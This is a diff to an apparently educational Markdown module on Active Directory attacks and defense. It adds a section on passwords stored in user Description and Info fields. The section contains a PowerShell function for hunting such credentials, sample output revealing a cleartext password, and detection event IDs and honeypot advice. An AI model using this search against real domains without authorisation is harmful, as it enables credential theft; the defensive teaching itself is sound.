@@ -38,8 +38,9 @@ This module covers **Active Directory attacks and defense** - common attack tech
 5. [GPP Passwords](#5-gpp-passwords)
 6. [GPO Permissions / GPO Files](#6-gpo-permissions--gpo-files)
 7. [Credentials in Shares](#7-credentials-in-shares)
-8. [Interview Questions](#8-interview-questions)
-9. [Additional Resources](#9-additional-resources)
+8. [Credentials in Object Properties](#8-credentials-in-object-properties)
+9. [Interview Questions](#9-interview-questions)
+10. [Additional Resources](#10-additional-resources)
 
 ---
 
@@ -1019,11 +1020,147 @@ net use E: \\DC1\sharedScripts /user:eagle\Administrator Slavi123
 
 **Event 4776 - Failed credential validation:**
 
-<img width="1040" height="478" alt="image" src="https://github.com/user-attachments/assets/2adb18cd-41f7-4e0b-af8c-b6f577040ee5" />
+<img width="1040" height="478" alt="image" src="https://github.com/user-attachments/assets/d9e9f888-0d9d-4e16-a31b-a9c47634eabc" />
 
 ---
 
-## 8. Interview Questions
+## 8. Credentials in Object Properties
+
+### Description
+
+> 📌 **Credentials in AD object properties** - administrators sometimes store passwords in Description or Info fields of user objects.
+
+```mermaid
+graph LR
+    User[AD User Object] --> Props[Properties]
+    Props --> Desc[Description]
+    Props --> Info[Info]
+    Props --> Other[Other Fields]
+    
+    Desc --> Risk[Risk: All domain users can read!]
+    Info --> Risk
+    
+    style User fill:#ffcccc,stroke:#333
+    style Risk fill:#ff9999,stroke:#333
+```
+
+**Common properties that may contain credentials:**
+- Description
+- Info
+- mail
+- telephoneNumber
+- displayName
+
+### Attack
+
+**PowerShell script to search for credentials:**
+
+```powershell
+Function SearchUserClearTextInformation {
+    Param (
+        [Parameter(Mandatory=$true)]
+        [Array] $Terms,
+
+        [Parameter(Mandatory=$false)]
+        [String] $Domain
+    )
+
+    if ([string]::IsNullOrEmpty($Domain)) {
+        $dc = (Get-ADDomain).RIDMaster
+    } else {
+        $dc = (Get-ADDomain $Domain).RIDMaster
+    }
+
+    $list = @()
+
+    foreach ($t in $Terms) {
+        $list += "(`$_.Description -like `"*$t*`")"
+        $list += "(`$_.Info -like `"*$t*`")"
+    }
+
+    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
+        Where { Invoke-Expression ($list -join ' -OR ') } | 
+        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
+        fl
+}
+```
+
+**Search for 'pass' in user properties:**
+
+```powershell
+SearchUserClearTextInformation -Terms "pass"
+```
+
+**Output:**
+
+```
+SamAccountName       : bonni
+Enabled              : True
+Description          : pass: Slavi123
+Info                 : 
+PasswordNeverExpires : True
+PasswordLastSet      : 05/12/2022 15.18.05
+```
+
+<img width="1383" height="340" alt="image" src="https://github.com/user-attachments/assets/1841a9ba-2041-49cf-8d4f-9444597adf14" />
+
+> 🔴 Every domain user can read most object properties including Description and Info!
+
+### Prevention
+
+| Mitigation | Description |
+|-----------|-------------|
+| **Continuous Assessment** | Regular scans for credentials in properties |
+| **User Education** | Train admins not to store creds in AD properties |
+| **Automated User Creation** | Reduce manual account creation |
+| **Regular Audits** | Review user properties quarterly |
+
+### Detection
+
+**Best Detection - User Behavior Analysis:**
+- Baseline normal behavior for service accounts
+- Alert on unusual authentication patterns
+
+**Event IDs to monitor:**
+
+| Event ID | Description |
+|----------|-------------|
+| 4624 | Successful logon |
+| 4625 | Failed logon |
+| 4768 | Kerberos TGT requested |
+
+> 📌 **Event 4738** (user modified) does NOT show what property was changed!
+
+**Event 4768 - Kerberos TGT request:**
+
+<img width="1365" height="1080" alt="image" src="https://github.com/user-attachments/assets/0177f40f-7cf9-4276-a067-58ca735cfb46" />
+
+### Honeypot Approach
+
+**Setup:**
+- Add fake password in Description field
+- Use incorrect password
+- Account must be enabled with recent logon attempts
+- Service accounts are better targets (manually created)
+- Last password change 2+ years ago
+
+**Honeypot triggered events:**
+
+**Event 4625 - Failed logon:**
+
+<img width="1515" height="1117" alt="image" src="https://github.com/user-attachments/assets/a3b75f91-2a94-426a-b83d-cd9a2dd622bd" />
+
+**Event 4771 - Failed pre-authentication:**
+
+<img width="1660" height="1125" alt="image" src="https://github.com/user-attachments/assets/d07aa0a7-7b56-41b9-9bab-5ee3f4ffac12" />
+
+**Event 4776 - Failed credential validation:**
+
+<img width="1040" height="478" alt="image" src="https://github.com/user-attachments/assets/d9e9f888-0d9d-4e16-a31b-a9c47634eabc" />
+
+---
+
+## 9. Interview Questions
 
 ### Q1: What is Kerberoasting and how does it work?
 
@@ -1201,7 +1338,7 @@ Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} |
 
 ---
 
-## 9. Additional Resources
+## 10. Additional Resources
 
 ### Tools
 
